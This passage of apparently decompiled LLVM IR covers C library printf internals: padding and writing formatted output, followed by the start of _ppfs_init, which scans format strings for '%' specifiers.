  store i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38960), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_150d8

dec_label_pc_15008:                               ; preds = %dec_label_pc_14f9c
  store i32 %v2_14fa4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_15048, i32* @r4, align 4
  store i32 %v2_14fa4, i32* %stack_var_-200, align 4
  br label %dec_label_pc_150d8thread-pre-split

dec_label_pc_15030:                               ; preds = %dec_label_pc_14f94
  br i1 %v7_15030, label %dec_label_pc_15038, label %dec_label_pc_1505c

dec_label_pc_15038:                               ; preds = %dec_label_pc_15030
  %v0_1503c = call i32 @__aeabi_read_tp()
  store i32 %v0_1503c, i32* %r0.global-to-local, align 4
  %v3_15040 = load i16, i16* @global_var_32088.1320, align 2
  %v4_15040 = sext i16 %v3_15040 to i32
  %v2_15044 = add i32 %v4_15040, %v0_1503c
  %v3_15044 = inttoptr i32 %v2_15044 to i32*
  %v4_15044 = load i32, i32* %v3_15044, align 4
  store i32 %v4_15044, i32* @r0, align 4
  %v0_1504c = load i32, i32* %r2.global-to-local, align 4
  %v1_1504c = add i32 %v0_1504c, 108
  store i32 %v1_1504c, i32* @r2, align 4
  %v4_15050 = call i32 @__GI___glibc_strerror_r(i32 %v4_15044, i32 %v2_15048, i32 %v1_1504c, i32 %v4_15040)
  store i32 %v4_15050, i32* %r0.global-to-local, align 4
  store i32 %v4_15050, i32* @r4, align 4
  br label %dec_label_pc_14fb0

dec_label_pc_1505c:                               ; preds = %dec_label_pc_15030
  %v4_15064 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 880) to i32*), align 4
  %v1_1506c = add i32 %v4_15064, 10
  store i32 %v1_1506c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15070

dec_label_pc_15070:                               ; preds = %dec_label_pc_150b8, %dec_label_pc_1505c
  %v1_15080 = phi i32 [ %v1_150b8, %dec_label_pc_150b8 ], [ %v4_15064, %dec_label_pc_1505c ]
  %v1_15070 = inttoptr i32 %v1_15080 to i8*
  %v2_15070 = load i8, i8* %v1_15070, align 1
  %v3_15070 = zext i8 %v2_15070 to i32
  store i32 %v3_15070, i32* %r2.global-to-local, align 4
  %v9_15078 = icmp eq i32 %v3_15070, %tmp99
  br i1 %v9_15078, label %dec_label_pc_15080, label %dec_label_pc_150b8

dec_label_pc_15080:                               ; preds = %dec_label_pc_15070
  %v2_15080 = sub i32 %v1_15080, %v4_15064
  %v0_15084 = load i32, i32* @fp, align 4
  store i32 %v0_15084, i32* %r0.global-to-local, align 4
  store i32 %v2_1508c, i32* %r2.global-to-local, align 4
  %v4_15094 = mul i32 %v2_15080, 4
  %v5_15094 = add i32 %v4_15094, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 29180)
  %v6_15094 = inttoptr i32 %v5_15094 to i32*
  %v7_15094 = load i32, i32* %v6_15094, align 4
  store i32 86176, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_15094)
  %v0_150a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_150a0 = icmp slt i32 %v0_150a0, 0
  br i1 %v1_150a0, label %dec_label_pc_15230, label %dec_label_pc_150a8

dec_label_pc_150a8:                               ; preds = %dec_label_pc_15080
  %v2_150ac = add i32 %v0_150a0, %v1_15108
  br label %dec_label_pc_1521c

dec_label_pc_150b8:                               ; preds = %dec_label_pc_15070
  %v1_150b8 = add i32 %v1_15080, 1
  %v3_150bc = icmp ult i32 %v1_150b8, %v1_1506c
  br i1 %v3_150bc, label %dec_label_pc_15070, label %dec_label_pc_15230

dec_label_pc_150c8:                               ; preds = %dec_label_pc_14f34
  %v0_150c8 = load i32, i32* @sl, align 4
  store i32 %v0_150c8, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_150c8, i32* @r4, align 4
  br label %dec_label_pc_150d8

dec_label_pc_150d8thread-pre-split:               ; preds = %.thread85, %dec_label_pc_14ec4, %dec_label_pc_14f7c, %dec_label_pc_15008
  %v1_150dc.pre = phi i32 [ %v1_150dc.pre205, %dec_label_pc_14ec4 ], [ %v1_150dc.pre.pre, %dec_label_pc_14f7c ], [ 1, %dec_label_pc_15008 ], [ %v2_14e44, %.thread85 ]
  %v0_150dc.pre = phi i32 [ 0, %dec_label_pc_14ec4 ], [ %v0_150dc.pre.pre, %dec_label_pc_14f7c ], [ 0, %dec_label_pc_15008 ], [ %v2_14eb8, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_14e38, %dec_label_pc_14ec4 ], [ %v0_14d68, %dec_label_pc_14f7c ], [ %v0_14d68, %dec_label_pc_15008 ], [ %v0_14e38, %.thread85 ]
  %v0_150d8.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_150d8

dec_label_pc_150d8:                               ; preds = %dec_label_pc_150d8thread-pre-split, %dec_label_pc_14ff8, %dec_label_pc_14fb0, %dec_label_pc_150c8
  %v1_150dc = phi i32 [ %v1_150dc.pre, %dec_label_pc_150d8thread-pre-split ], [ %storemerge97, %dec_label_pc_14ff8 ], [ %v3_14fbc, %dec_label_pc_14fb0 ], [ %v6_14f48, %dec_label_pc_150c8 ]
  %v0_150dc = phi i32 [ %v0_150dc.pre, %dec_label_pc_150d8thread-pre-split ], [ 0, %dec_label_pc_14ff8 ], [ 0, %dec_label_pc_14fb0 ], [ %v0_150c8, %dec_label_pc_150c8 ]
  %v0_150e4 = phi i32 [ %v0_150d8.pr, %dec_label_pc_150d8thread-pre-split ], [ 11, %dec_label_pc_14ff8 ], [ 11, %dec_label_pc_14fb0 ], [ 11, %dec_label_pc_150c8 ]
  %v0_15124 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_150d8thread-pre-split ], [ %v0_14d68, %dec_label_pc_14ff8 ], [ %v0_14d68, %dec_label_pc_14fb0 ], [ %v0_14d68, %dec_label_pc_150c8 ]
  %v7_150d8 = icmp eq i32 %v0_150e4, 11
  %v2_150dc = add i32 %v1_150dc, %v0_150dc
  br i1 %v7_150d8, label %dec_label_pc_150f4, label %bb173

bb173:                                            ; preds = %dec_label_pc_150d8
  %v7_150ec = icmp sgt i32 %v0_150e4, 5
  %. = select i1 %v7_150ec, i32 2, i32 1
  %v2_150f0 = add i32 %v2_150dc, %.
  br label %dec_label_pc_150f4

dec_label_pc_150f4:                               ; preds = %dec_label_pc_150d8, %bb173
  %v0_15108 = phi i32 [ %v2_150dc, %dec_label_pc_150d8 ], [ %v2_150f0, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_150f8 = icmp uge i32 %tmp98, %v0_15108
  %v9_150f8 = icmp eq i32 %tmp98, %v0_15108
  %v2_150fc = xor i1 %v9_150f8, true
  %v3_150fc = and i1 %v3_150f8, %v2_150fc
  br i1 %v3_150fc, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_150f4
  %v2_150f8 = sub i32 %tmp98, %v0_15108
  store i32 %v2_150f8, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_150f4, %bb174
  store i32 %v1_15108, i32* %r2.global-to-local, align 4
  %v2_15104 = xor i1 %v3_150f8, true
  %v3_15104 = or i1 %v9_150f8, %v2_15104
  br i1 %v3_15104, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_1510c.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_1511c = phi i32 [ %v1_1510c.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_15108 = add i32 %v0_15108, %v1_15108
  %v2_1510c = add i32 %v2_15108, %v2_1511c
  %v0_15118 = load i32, i32* @sb, align 4
  %v7_15118 = icmp eq i32 %v0_15118, 48
  br i1 %v7_15118, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_1511c = add i32 %v2_1511c, %v0_150dc
  store i32 %v3_1511c, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_15134 = phi i32 [ %v2_1511c, %bb177 ], [ 0, %bb178 ]
  %v1_15124 = and i32 %v0_15124, 8
  store i32 %v1_15124, i32* @r7, align 4
  %v2_15124 = icmp eq i32 %v1_15124, 0
  br i1 %v2_15124, label %dec_label_pc_1512c, label %dec_label_pc_15148

dec_label_pc_1512c:                               ; preds = %.thread30
  %v0_1512c = load i32, i32* @fp, align 4
  store i32 %v0_1512c, i32* %r0.global-to-local, align 4
  store i32 %v0_15134, i32* %r2.global-to-local, align 4
  %v4_15138 = call i32 @_charpad(i32 %v0_1512c, i8 32, i32 %v0_15134)
  store i32 %v4_15138, i32* %r0.global-to-local, align 4
  %v1_1513c = load i32, i32* @sl, align 4
  %v9_1513c = icmp eq i32 %v4_15138, %v1_1513c
  br i1 %v9_1513c, label %dec_label_pc_15144, label %dec_label_pc_15230

dec_label_pc_15144:                               ; preds = %dec_label_pc_1512c
  %v0_15144 = load i32, i32* @r7, align 4
  store i32 %v0_15144, i32* @sl, align 4
  %v0_15150.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15148

dec_label_pc_15148:                               ; preds = %.thread30, %dec_label_pc_15144
  %v0_15150 = phi i32 [ %v0_150e4, %.thread30 ], [ %v0_15150.pre, %dec_label_pc_15144 ]
  %v0_1514c = load i32, i32* @fp, align 4
  %v2_15150 = add i32 %v0_15150, add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -38952)
  store i32 %v2_15150, i32* %r0.global-to-local, align 4
  %v2_15154 = inttoptr i32 %v2_15150 to i8*
  %v3_15154 = call i32 @__GI_fputs_unlocked(i8* %v2_15154, i32 %v0_1514c)
  %v0_15158 = load i32, i32* @fp, align 4
  store i32 %v0_15158, i32* %r0.global-to-local, align 4
  %v0_15160 = load i32, i32* @r8, align 4
  store i32 %v0_15160, i32* %r2.global-to-local, align 4
  %v4_15164 = call i32 @_charpad(i32 %v0_15158, i8 48, i32 %v0_15160)
  store i32 %v4_15164, i32* %r0.global-to-local, align 4
  %v1_15168 = load i32, i32* @r8, align 4
  %v9_15168 = icmp eq i32 %v4_15164, %v1_15168
  br i1 %v9_15168, label %dec_label_pc_15170, label %dec_label_pc_15230

dec_label_pc_15170:                               ; preds = %dec_label_pc_15148
  %v3_15170 = load i32, i32* %stack_var_-44, align 4
  %v2_15174 = icmp eq i32 %v3_15170, 0
  br i1 %v2_15174, label %dec_label_pc_1517c, label %dec_label_pc_151a0

dec_label_pc_1517c:                               ; preds = %dec_label_pc_15170
  %v0_1517c = load i32, i32* @r5, align 4
  %v2_1517c = icmp eq i32 %v0_1517c, 0
  br i1 %v2_1517c, label %dec_label_pc_15204, label %dec_label_pc_15184

dec_label_pc_15184:                               ; preds = %dec_label_pc_1517c
  %v0_15184 = load i32, i32* @r4, align 4
  store i32 %v0_15184, i32* %r0.global-to-local, align 4
  %v0_1518c = load i32, i32* @fp, align 4
  store i32 %v0_1518c, i32* %r2.global-to-local, align 4
  %v3_15190 = inttoptr i32 %v0_1518c to i16*
  %v4_15190 = call i32 @__stdio_fwrite(i32 %v0_15184, i32 %v0_1517c, i16* %v3_15190)
  store i32 %v4_15190, i32* %r0.global-to-local, align 4
  %v1_15194 = load i32, i32* @r5, align 4
  %v9_15194 = icmp eq i32 %v4_15190, %v1_15194
  br i1 %v9_15194, label %dec_label_pc_15204, label %dec_label_pc_15230

dec_label_pc_151a0:                               ; preds = %dec_label_pc_15170
  store i32 %v2_15048, i32* @r6, align 4
  store i32 %v2_14f38, i32* @r8, align 4
  store i32 %v2_14f44, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_151f0.pr = load i32, i32* @r5, align 4
  %v2_151f041 = icmp eq i32 %v0_151f0.pr, 0
  store i32 %v2_14f38, i32* @r1, align 4
  store i32 %v2_15048, i32* @r0, align 4
  br i1 %v2_151f041, label %dec_label_pc_15204, label %dec_label_pc_151b8

dec_label_pc_151b8:                               ; preds = %dec_label_pc_151a0, %dec_label_pc_151ec
  %v1_151bc = phi i32 [ %v2_151ec, %dec_label_pc_151ec ], [ %v0_151f0.pr, %dec_label_pc_151a0 ]
  %v2_151b8 = icmp ult i32 %v1_151bc, 128
  %.v1_151bc = select i1 %v2_151b8, i32 %v1_151bc, i32 128
  store i32 %.v1_151bc, i32* %r2.global-to-local, align 4
  %v6_151c4 = call i32 @__GI_wcsrtombs(i32 %v2_15048, i32 %v2_14f38, i32 %.v1_151bc, i32 %v2_14f44, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_151c4, i32* @r4, align 4
  %v2_151c8 = icmp eq i32 %v6_151c4, 0
  store i32 %v6_151c4, i32* %r0.global-to-local, align 4
  br i1 %v2_151c8, label %dec_label_pc_151ec, label %dec_label_pc_151d4

dec_label_pc_151d4:                               ; preds = %dec_label_pc_151b8
  store i32 %v2_15048, i32* %r0.global-to-local, align 4
  %v0_151dc = load i32, i32* @fp, align 4
  store i32 %v0_151dc, i32* %r2.global-to-local, align 4
  %v3_151e0 = inttoptr i32 %v0_151dc to i16*
  %v4_151e0 = call i32 @__stdio_fwrite(i32 %v2_15048, i32 %v6_151c4, i16* %v3_151e0)
  store i32 %v4_151e0, i32* %r0.global-to-local, align 4
  %v1_151e4 = load i32, i32* @r4, align 4
  %v9_151e4 = icmp eq i32 %v4_151e0, %v1_151e4
  br i1 %v9_151e4, label %dec_label_pc_151ec, label %dec_label_pc_15230

dec_label_pc_151ec:                               ; preds = %dec_label_pc_151d4, %dec_label_pc_151b8
  %v0_151ec = phi i32 [ %v4_151e0, %dec_label_pc_151d4 ], [ 0, %dec_label_pc_151b8 ]
  %v1_151ec = load i32, i32* @r5, align 4
  %v2_151ec = sub i32 %v1_151ec, %v0_151ec
  store i32 %v2_151ec, i32* @r5, align 4
  %v2_151f0 = icmp eq i32 %v2_151ec, 0
  store i32 %v2_14f38, i32* @r1, align 4
  store i32 %v2_15048, i32* @r0, align 4
  br i1 %v2_151f0, label %dec_label_pc_15204, label %dec_label_pc_151b8

dec_label_pc_15204:                               ; preds = %dec_label_pc_151ec, %dec_label_pc_151a0, %dec_label_pc_15184, %dec_label_pc_1517c
  %v0_15204 = load i32, i32* @fp, align 4
  store i32 %v0_15204, i32* %r0.global-to-local, align 4
  %v0_1520c = load i32, i32* @sl, align 4
  store i32 %v0_1520c, i32* %r2.global-to-local, align 4
  %v4_15210 = call i32 @_charpad(i32 %v0_15204, i8 32, i32 %v0_1520c)
  store i32 %v4_15210, i32* %r0.global-to-local, align 4
  %v1_15214 = load i32, i32* @sl, align 4
  %v9_15214 = icmp eq i32 %v4_15210, %v1_15214
  br i1 %v9_15214, label %dec_label_pc_1521c, label %dec_label_pc_15230

dec_label_pc_1521c:                               ; preds = %dec_label_pc_15204, %dec_label_pc_150a8, %dec_label_pc_14efc, %dec_label_pc_14d0c
  %stack_var_-336.4 = phi i32 [ %v0_14d68, %dec_label_pc_14d0c ], [ %v0_15124, %dec_label_pc_15204 ], [ %v0_14d68, %dec_label_pc_150a8 ], [ %v0_14d68, %dec_label_pc_14efc ]
  %stack_var_-356.3 = phi i32 [ %v1_15108, %dec_label_pc_14d0c ], [ %v2_1510c, %dec_label_pc_15204 ], [ %v2_150ac, %dec_label_pc_150a8 ], [ %v2_14f00, %dec_label_pc_14efc ]
  %v3_1521c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_1521c, i32* @r4, align 4
  store i32 %v3_1521c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14c34.outer

dec_label_pc_15228:                               ; preds = %dec_label_pc_14c90
  %v1_15228 = add i32 %v0_14c98, 2
  store i32 %v1_15228, i32* @r4, align 4
  br label %dec_label_pc_14c34.outer36

dec_label_pc_15230:                               ; preds = %dec_label_pc_150b8, %dec_label_pc_14f34, %dec_label_pc_15204, %dec_label_pc_15184, %dec_label_pc_15148, %dec_label_pc_1512c, %dec_label_pc_15080, %dec_label_pc_14f5c, %dec_label_pc_14ed4, %bb142, %dec_label_pc_151d4
  br label %dec_label_pc_15238

dec_label_pc_15238:                               ; preds = %dec_label_pc_14c84, %bb, %dec_label_pc_14bc8, %dec_label_pc_15230
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_14bc8 ], [ -1, %dec_label_pc_15230 ], [ %v1_15108, %dec_label_pc_14c84 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_14b78, i32* @r5, align 4
  store i32 %v9_14b78, i32* @r6, align 4
  store i32 %v12_14b78, i32* @r7, align 4
  store i32 %v15_14b78, i32* @r8, align 4
  store i32 %v18_14b78, i32* @sb, align 4
  store i32 %v21_14b78, i32* @sl, align 4
  store i32 %v24_14b78, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_15228, { 1, 0 }
  uselistorder i32 %v3_1521c, { 1, 2, 0 }
  uselistorder i32 %v2_151ec, { 1, 2, 0 }
  uselistorder i32 %v0_15134, { 1, 0 }
  uselistorder i32 %v2_1511c, { 2, 0, 1 }
  uselistorder i1 %v9_150f8, { 1, 0 }
  uselistorder i32 %v2_150dc, { 1, 0 }
  uselistorder i32 %v0_15124, { 1, 0 }
  uselistorder i32 %v0_150dc, { 1, 0 }
  uselistorder i32 %v1_150b8, { 1, 0 }
  uselistorder i32 %v1_15080, { 1, 0, 2 }
  uselistorder i32 %v4_15050, { 1, 2, 0 }
  uselistorder i32 %v4_15040, { 1, 0 }
  uselistorder i32 %v0_14fb4, { 1, 0 }
  uselistorder i32 %v2_14fa4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_14f6c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_14ee4, { 1, 0 }
  uselistorder i32 %v2_14e44, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_14e60, { 1, 2, 3, 0 }
  uselistorder i32 %v2_14de0, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_14d48, { 0, 2, 1, 3 }
  uselistorder i32 %v1_14cec.pre, { 1, 0, 2 }
  uselistorder i32 %v1_14ce4, { 1, 0 }
  uselistorder i32 %v1_14c90, { 0, 1, 3, 2 }
  uselistorder i32 %v1_15108, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9 }
  uselistorder i32 %v2_14c50, { 1, 0 }
  uselistorder i32 %v1_14c48.lcssa, { 1, 0 }
  uselistorder i8 %v2_14c34, { 1, 0 }
  uselistorder i32 %v2_14c48, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_14c60, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14d68, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_14e58, { 1, 0 }
  uselistorder i1 %v7_14da8, { 1, 2, 0 }
  uselistorder i1 %v7_14f94, { 1, 0 }
  uselistorder i1 %v7_14f0c, { 1, 0 }
  uselistorder i1 %v7_14de8, { 1, 0 }
  uselistorder i32 %v2_14f44, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_14f38, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_15048, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_14ce8, { 1, 3, 2, 0 }
  uselistorder i32 %v4_14cc4, { 1, 0 }
  uselistorder i32 %v2_14b80, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 19, 5, 6, 7, 8, 9, 10, 11, 22, 12, 13, 14, 15, 16, 17, 18, 0, 20, 21, 23, 25, 24, 1, 26, 27, 28, 29, 30 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 9, 8, 10, 12, 11, 17, 13, 14, 15, 16, 18, 19, 22, 20, 21, 24, 23, 26, 25, 28, 27, 30, 29, 33, 31, 32, 36, 37, 34, 35, 47, 38, 48, 1, 40, 39, 42, 41, 44, 43, 46, 45, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 -120112), { 1, 0 }
  uselistorder label %dec_label_pc_15238, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_15230, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_151b8, { 1, 0 }
  uselistorder label %dec_label_pc_15148, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_150f4, { 1, 0 }
  uselistorder label %dec_label_pc_150d8, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_150d8thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14ff8, { 1, 0 }
  uselistorder label %dec_label_pc_14fb0, { 1, 0 }
  uselistorder label %dec_label_pc_14ec4, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_14d98, { 1, 0 }
  uselistorder label %dec_label_pc_14d94, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14ce0, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_14c84, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_14c50, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_14c34.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_1526c = load i32, i32* @r4, align 4
  %v6_1526c = load i32, i32* @r5, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_15278 = load i32, i32* @r1, align 4
  store i32 %v0_15278, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_15284 = bitcast i32* %arg1 to i8*
  %v4_15284 = call i32 @__GI_memset(i8* %v3_15284, i32 0, i32 152)
  store i32 %v4_15284, i32* %r0.global-to-local, align 4
  %v0_15288 = load i32, i32* @r4, align 4
  %v1_15288 = add i32 %v0_15288, 24
  %v2_15288 = inttoptr i32 %v1_15288 to i32*
  %v3_15288 = load i32, i32* %v2_15288, align 4
  store i32 %v3_15288, i32* %r3.global-to-local, align 4
  %v0_1528c = load i32, i32* @r5, align 4
  %v2_1528c = inttoptr i32 %v0_15288 to i32*
  store i32 %v0_1528c, i32* %v2_1528c, align 4
  %v0_15290 = load i32, i32* %r3.global-to-local, align 4
  %v1_15290 = add i32 %v0_15290, -1
  %v1_15294 = load i32, i32* @r4, align 4
  %v2_15294 = add i32 %v1_15294, 24
  %v3_15294 = inttoptr i32 %v2_15294 to i32*
  store i32 %v1_15290, i32* %v3_15294, align 4
  %v0_15298 = load i32, i32* @r4, align 4
  %v1_15298 = add i32 %v0_15298, 40
  store i32 %v1_15298, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_152a821 = inttoptr i32 %v1_15298 to i32*
  store i32 8, i32* %v2_152a821, align 4
  %v3_152a822 = load i32, i32* %r2.global-to-local, align 4
  %v4_152a823 = add i32 %v3_152a822, 4
  store i32 %v4_152a823, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_152a4.dec_label_pc_152a4_crit_edge

dec_label_pc_152a4.dec_label_pc_152a4_crit_edge:  ; preds = %entry, %dec_label_pc_152a4.dec_label_pc_152a4_crit_edge
  %v4_152a824 = phi i32 [ %v4_152a823, %entry ], [ %v4_152a8, %dec_label_pc_152a4.dec_label_pc_152a4_crit_edge ]
  %v0_152a4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_152a8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_152a4 = add i32 %v0_152a4.pre, -1
  store i32 %v1_152a4, i32* %r3.global-to-local, align 4
  %v7_152a4 = icmp eq i32 %v0_152a4.pre, 1
  %v2_152a8 = inttoptr i32 %v4_152a824 to i32*
  store i32 %v0_152a8.pre, i32* %v2_152a8, align 4
  %v3_152a8 = load i32, i32* %r2.global-to-local, align 4
  %v4_152a8 = add i32 %v3_152a8, 4
  store i32 %v4_152a8, i32* %r2.global-to-local, align 4
  br i1 %v7_152a4, label %dec_label_pc_152b0, label %dec_label_pc_152a4.dec_label_pc_152a4_crit_edge

dec_label_pc_152b0:                               ; preds = %dec_label_pc_152a4.dec_label_pc_152a4_crit_edge
  %v0_152b0 = load i32, i32* @r5, align 4
  store i32 %v0_152b0, i32* %r2.global-to-local, align 4
  %v1_152f02 = inttoptr i32 %v0_152b0 to i8*
  %v2_152f03 = load i8, i8* %v1_152f02, align 1
  %v3_152f04 = zext i8 %v2_152f03 to i32
  store i32 %v3_152f04, i32* %r0.global-to-local, align 4
  %v2_152f45 = icmp eq i8 %v2_152f03, 0
  br i1 %v2_152f45, label %dec_label_pc_152fc, label %dec_label_pc_152b8

dec_label_pc_152b8:                               ; preds = %dec_label_pc_152b0, %dec_label_pc_152f0.backedge
  %v0_152c0 = phi i32 [ %storemerge, %dec_label_pc_152f0.backedge ], [ %v0_152b0, %dec_label_pc_152b0 ]
  %v0_152b8 = phi i32 [ %v3_152f0, %dec_label_pc_152f0.backedge ], [ %v3_152f04, %dec_label_pc_152b0 ]
  %v7_152b8 = icmp eq i32 %v0_152b8, 37
  br i1 %v7_152b8, label %dec_label_pc_152c0, label %dec_label_pc_152ec

dec_label_pc_152c0:                               ; preds = %dec_label_pc_152b8
  %v1_152c0 = add i32 %v0_152c0, 1
  %v2_152c0 = inttoptr i32 %v1_152c0 to i8*
  %v3_152c0 = load i8, i8* %v2_152c0, align 1
  %v4_152c0 = zext i8 %v3_152c0 to i32
  store i32 %v4_152c0, i32* %r3.global-to-local, align 4
  store i32 %v1_152c0, i32* %r2.global-to-local, align 4
  %v7_152c4 = icmp eq i8 %v3_152c0, 37
  br i1 %v7_152c4, label %dec_label_pc_152ec, label %dec_label_pc_152cc

dec_label_pc_152cc:                               ; preds = %dec_label_pc_152c0
  %v1_152cc = load i32, i32* @r4, align 4
  %v2_152cc = inttoptr i32 %v1_152cc to i32*
  store i32 %v1_152c0, i32* %v2_152cc, align 4
  %v0_152d0 = load i32, i32* @r4, align 4
  store i32 %v0_152d0, i32* %r0.global-to-local, align 4
  %v1_152d4 = inttoptr i32 %v0_152d0 to i8*
  %v2_152d4 = call i32 @_ppfs_parsespec(i8* %v1_152d4)
  store i32 %v2_152d4, i32* %r0.global-to-local, align 4
  %v1_152d8 = icmp slt i32 %v2_152d4, 0
  br i1 %v1_152d8, label %dec_label_pc_15300.loopexit, label %dec_label_pc_152e4

dec_label_pc_152e4:                               ; preds = %dec_label_pc_152cc
  %v0_152e4 = load i32, i32* @r4, align 4
  %v1_152e4 = inttoptr i32 %v0_152e4 to i32*
  %v2_152e4 = load i32, i32* %v1_152e4, align 4
  br label %dec_label_pc_152f0.backedge

dec_label_pc_152ec:                               ; preds = %dec_label_pc_152b8, %dec_label_pc_152c0
  %v0_152ec = phi i32 [ %v0_152c0, %dec_label_pc_152b8 ], [ %v1_152c0, %dec_label_pc_152c0 ]
  %v1_152ec = add i32 %v0_152ec, 1
  br label %dec_label_pc_152f0.backedge

dec_label_pc_152f0.backedge:                      ; preds = %dec_label_pc_152ec, %dec_label_pc_152e4
  %storemerge = phi i32 [ %v1_152ec, %dec_label_pc_152ec ], [ %v2_152e4, %dec_label_pc_152e4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_152f0 = inttoptr i32 %storemerge to i8*
  %v2_152f0 = load i8, i8* %v1_152f0, align 1
  %v3_152f0 = zext i8 %v2_152f0 to i32
  store i32 %v3_152f0, i32* %r0.global-to-local, align 4
  %v2_152f4 = icmp eq i8 %v2_152f0, 0
  br i1 %v2_152f4, label %dec_label_pc_152f0.dec_label_pc_152fc_crit_edge, label %dec_label_pc_152b8

dec_label_pc_152f0.dec_label_pc_152fc_crit_edge:  ; preds = %dec_label_pc_152f0.backedge
  %v0_152fc.pre = load i32, i32* @r5, align 4
